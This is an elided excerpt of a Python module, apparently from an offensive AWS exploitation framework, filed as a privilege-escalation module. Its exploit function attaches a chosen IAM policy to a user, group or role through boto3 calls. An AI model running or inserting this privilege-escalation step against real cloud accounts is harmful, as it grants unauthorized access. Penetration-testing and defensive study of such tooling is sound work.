# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Nebula\teamserver\core\module\privesc\aws_iam_attach_policy_terraform.py
import json
import os.path
import sys
...
def attachPolicy(idname, idtype, polarn, profile):
    try:
        if idtype == "user":
            profile.attach_user_policy(PolicyArn=polarn, UserName=idname)
        elif idtype == "group":
            profile.attach_group_policy(PolicyArn=polarn, GroupName=idname)
        elif idtype == "role":
            profile.attach_role_policy(PolicyArn=polarn, RoleName=idname)
        return {
            "Identity": idname,
            "PolicyArn": polarn,
        ...
        return {"error": f"Error Attaching: {str(e)}"}
...
def exploit(all_sessions, cred_prof, useragent, web_proxies, workspace):
    ...
    try:
        ...
        response = attachPolicy(
            idname=id_name, idtype=id_type, polarn=policy_arn, profile=iamprofile
        )
